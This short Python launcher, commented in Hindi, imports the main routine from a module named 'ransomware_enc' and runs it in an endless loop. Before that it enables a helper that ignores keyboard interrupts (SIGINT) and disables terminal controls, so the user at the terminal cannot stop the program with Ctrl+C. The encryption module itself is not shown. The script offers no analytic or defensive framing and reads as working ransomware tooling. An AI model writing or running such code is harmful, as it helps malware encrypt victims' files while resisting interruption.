from _C_M_D_.ransomware_enc import main

from _C_M_D_ import protect_interrupts_enc as pi

# एक बार enable कर दें (main thread में)
pi.enable_protection(ignore_message="Interrupt ignored in critical section", disable_termios=True)

try:
    while True:
        # आपका मुख्य काम
        main()
except KeyboardInterrupt:
    # शायद unreachable because we've ignored SIGINT, पर safety के लिए रखें
    print("KeyboardInterrupt caught.")
finally:
    # प्रोग्राम बंद होने से पहले restore ज़रूरी है
    pi.disable_protection()